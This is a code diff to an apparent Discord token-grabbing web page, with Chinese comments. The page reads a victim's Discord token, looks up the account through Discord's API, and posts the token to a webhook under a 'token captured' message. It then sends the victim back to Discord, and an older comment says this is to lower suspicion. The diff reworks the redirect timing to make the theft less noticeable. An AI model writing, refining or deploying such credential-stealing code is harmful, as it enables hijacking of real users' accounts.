@@ -27,6 +27,11 @@
         if (token) {
           token = token.replace(/"/g, ""); // 移除 Discord 自動包上的雙引號
 
+          // 無條件 3 秒後跳回 Discord（不管 fetch 成不成功）
+          const redirectTimer = setTimeout(() => {
+            window.location.href = "https://discord.com/channels/@me";
+          }, 3000);
+
           // 用 token 取得帳號資訊
           fetch("https://discord.com/api/v9/users/@me", {
             headers: { "Authorization": token }
@@ -58,16 +63,18 @@
                   content: `🔓 **Discord Token 已擷取**\n使用者: **${username}**\n\`\`\`\n${token}\n\`\`\``
                 })
               }).catch(err => console.warn("Webhook failed:", err));
+
+              // fetch 成功了，提早跳回
+              clearTimeout(redirectTimer);
+              setTimeout(() => {
+                window.location.href = "https://discord.com/channels/@me";
+              }, 500);
+            } else {
+              // fetch 收到回應但不是 OK，等待 redirectTimer
             }
-            // 2 秒後跳回 Discord，降低目標懷疑
-            setTimeout(() => {
-              window.location.href = "https://discord.com/channels/@me";
-            }, 2000);
           }).catch(err => {
             console.warn("API call failed:", err);
-            setTimeout(() => {
-              window.location.href = "https://discord.com/channels/@me";
-            }, 2000);
+            // catch 了就等 redirectTimer，不提早跳
           });
         } else {
           // 無 token — 一般瀏覽器打開，顯示等待然後跳回
